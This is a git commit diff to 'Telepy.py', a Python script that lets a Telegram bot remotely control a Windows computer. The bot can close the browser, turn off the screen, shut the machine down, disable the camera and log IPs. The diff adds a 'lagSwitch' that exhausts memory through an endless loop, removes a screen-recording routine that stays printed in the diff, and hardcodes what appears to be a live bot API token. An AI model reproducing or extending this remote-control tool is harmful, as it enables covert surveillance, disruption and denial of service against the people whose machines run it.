5a1b810d075fbc1ec6813043dee21b0148723163
DmitriyFov <70380281+DmitriyFov@users.noreply.github.com>
2022-05-18 16:16:41 +0300

    Update Telepy.py

--- Telepy.py
+++ Telepy.py
@@ -12,16 +12,20 @@ import subprocess
 import ctypes
 import os
 import shutil
-bot = telebot.TeleBot('') # here you paste your bot's API, which you can get in "BotFather" bot
+import ctypes.wintypes
+import time
+from itertools import count
+bot = telebot.TeleBot('5323047396:AAHBV5nqYBGqa5vUEAOS5BtOXZIl3LEpXVk') # here you paste your bot's API, which you can get in "BotFather" bot
 @bot.message_handler(content_types=['text','document', 'audio'])
  
 def get_text_messages(message):
     # bot's interface
-    bot.send_message(message.from_user.id, "Commands\n\n\n"             "1 - close browser\n\n"       "2 - screenOff function\n\n"        "3 - shutdown computer\n\n"       "4 - turn off the camera\n\n"       "5 - iplogger\n\n"       "6 - screenphotos")
+    bot.send_message(message.from_user.id, "Commands\n\n\n"             "1 - close browser\n\n"       "2 - screenOff function\n\n"        "3 - shutdown computer\n\n"       "4 - turn off the camera\n\n"       "5 - iplogger\n\n"       "6 - lagSwitch\n\n"       "7 - exit")
     
     def screenOff():
         return win32gui.SendMessage(win32con.HWND_BROADCAST,
                             win32con.WM_SYSCOMMAND, win32con.SC_MONITORPOWER, 2)
+     
     global chatId    
     chatId = message.chat.id 
     
@@ -64,34 +68,10 @@ def get_text_messages(message):
             print("sww")
     if message.text == "6":
         try:
-# display screen resolution, get it using pyautogui itself
-            SCREEN_SIZE = tuple(pyautogui.size())
-# define the codec
-            fourcc = cv2.VideoWriter_fourcc(*"XVID")
-# frames per second
-            fps = 12.0
-# create the video write object
-            out = cv2.VideoWriter("output.avi", fourcc, fps, (SCREEN_SIZE))
-# the time you want to record in seconds
-            record_seconds = 1000
-            for i in range(int(record_seconds * fps)):
-    # make a screenshot
-                img = pyautogui.screenshot()
-    # convert these pixels to a proper numpy array to work with OpenCV
-                frame = np.array(img)
-    # convert colors from BGR to RGB
-                frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
-    # write the frame
-                out.write(frame)
-    # show the frame
-                cv2.imshow("screenshot", frame)
-    # if the user clicks q, it exits
-                if cv2.waitKey(1) == ord("q"):
-                    break
+            list(count(0))
         except:
             print("sww")
-# make sure everything is closed when exited
-    cv2.destroyAllWindows()
-    out.release()
-                
+    if message.text == "7":
+        os.abort()
+                                             
 bot.polling(none_stop=True, interval=0)
